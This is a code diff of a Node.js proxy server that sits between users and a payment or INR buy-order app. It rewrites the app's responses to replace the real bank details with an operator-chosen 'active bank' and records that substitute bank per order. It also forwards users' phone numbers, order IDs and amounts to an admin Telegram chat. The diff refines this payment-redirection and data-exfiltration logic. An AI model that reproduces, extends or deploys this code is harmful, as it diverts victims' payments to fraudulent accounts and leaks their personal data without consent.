@@ -36,7 +36,7 @@ if (REDIS_URL && REDIS_TOKEN) {
 
 let cachedData = null;
 let cacheTime = 0;
-const CACHE_TTL = 15000;
+const CACHE_TTL = 30000;
 const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
@@ -1107,37 +1107,47 @@ async function proxyAndReplaceBankDetails(req, res, label) {
   if (reqEff.botEnabled === false) return await transparentProxy(req, res);
 
   try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const [proxyResult, orderBankLookupId] = await Promise.all([
+      proxyFetch(req),
+      (async () => {
+        const bodyOid = req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || req.parsedBody?.orderNo || '';
+        const qOid = req.query?.buyOrderNo || req.query?.orderId || '';
+        return bodyOid || qOid || '';
+      })()
+    ]);
+    const { response, respBody, respHeaders, jsonResp } = proxyResult;
     const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
     const eff = getEffectiveSettings(data, detectedUserId);
-    const active = eff.botEnabled !== false ? await getActiveBankAndSave(data, detectedUserId) : null;
+    const active = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;
 
     const respData = getResponseData(jsonResp);
 
     if (debugNextResponse && data.adminChatId && bot) {
       debugNextResponse = false;
-      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
     }
 
     const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
-    const orderId = rd.orderId || rd.orderNo || rd.buyOrderId || rd.buyOrderNo || req.parsedBody?.orderId || req.parsedBody?.buyOrderNo || 'N/A';
+    const orderId = rd.orderId || rd.orderNo || rd.buyOrderId || rd.buyOrderNo || orderBankLookupId || 'N/A';
 
-    if (respData && active) {
+    if (respData) {
       const savedBank = await getOrderBank(orderId);
       const bankToUse = savedBank || active;
-      if (Array.isArray(respData)) {
-        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
-      } else {
-        const originalValues = {};
-        deepReplace(respData, bankToUse, originalValues, 0);
-      }
-      if (!savedBank && orderId !== 'N/A') {
-        saveOrderBank(orderId, active);
+      if (bankToUse) {
+        if (Array.isArray(respData)) {
+          respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, bankToUse, {}, 0); });
+        } else {
+          deepReplace(respData, bankToUse, {}, 0);
+        }
+        if (!savedBank && active && orderId !== 'N/A') {
+          saveOrderBank(orderId, active);
+        }
       }
     }
 
-    if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
+    sendJson(res, respHeaders, jsonResp, respBody);
+
+    if (data.adminChatId && bot && !isLogOff(data, detectedUserId)) {
       const amount = rd.amount || rd.orderAmount || rd.buyAmount || req.parsedBody?.amount || 'N/A';
       const phone = getPhone(data, detectedUserId);
       bot.sendMessage(data.adminChatId,
@@ -1155,8 +1165,6 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
       trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || jsonResp?.data?.buyOrderId || ''}`);
       saveData(data).catch(()=>{});
     }
-
-    sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) {
     console.error('Proxy+replace error:', req.originalUrl, e.message);
     if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
@@ -1221,14 +1229,6 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
 
     const listData = getResponseData(jsonResp);
     if (listData) {
-      const applyToItem = async (item) => {
-        const itemOrderId = item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '';
-        const savedBank = await getOrderBank(itemOrderId);
-        if (savedBank) {
-          const origVals = {};
-          deepReplace(item, savedBank, origVals, 0);
-        }
-      };
       let items = [];
       if (Array.isArray(listData)) {
         items = listData;
@@ -1241,7 +1241,19 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
       } else {
         items = [listData];
       }
-      await Promise.all(items.map(item => applyToItem(item)));
+      const orderIds = items.map(item => item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '').filter(Boolean);
+      const bankMap = {};
+      await Promise.all(orderIds.map(async (oid) => {
+        const b = await getOrderBank(oid);
+        if (b) bankMap[oid] = b;
+      }));
+      for (const item of items) {
+        const oid = item.orderId || item.orderNo || item.buyOrderId || item.buyOrderNo || item.id || '';
+        const savedBank = bankMap[oid];
+        if (savedBank) {
+          deepReplace(item, savedBank, {}, 0);
+        }
+      }
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1292,9 +1304,17 @@ app.post('/app/buy/order', async (req, res) => {
     if (userId) { trackUser(data, userId, 'Buy Order'); saveData(data).catch(()=>{}); }
     const buyData = getResponseData(jsonResp);
     const body = req.parsedBody || {};
+    const newOrderId = typeof buyData === 'string' ? buyData : (buyData?.orderId || buyData?.orderNo || buyData?.buyOrderNo || buyData?.buyOrderId || '');
+    if (newOrderId) {
+      const eff = getEffectiveSettings(data, userId);
+      const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, userId) : null;
+      if (active) {
+        saveOrderBank(newOrderId, active);
+      }
+    }
     if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
       const phone = getPhone(data, userId);
-      bot.sendMessage(data.adminChatId, `⚠️ Buy INR Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${typeof buyData === 'string' ? buyData : (buyData?.orderId || buyData?.orderNo || 'N/A')}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      bot.sendMessage(data.adminChatId, `⚠️ Buy INR Order [${userId || 'N/A'}]${phone ? ' (' + phone + ')' : ''}\nAmount: ₹${body.amount || body.buyAmount || 'N/A'}\nOrder: ${newOrderId || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
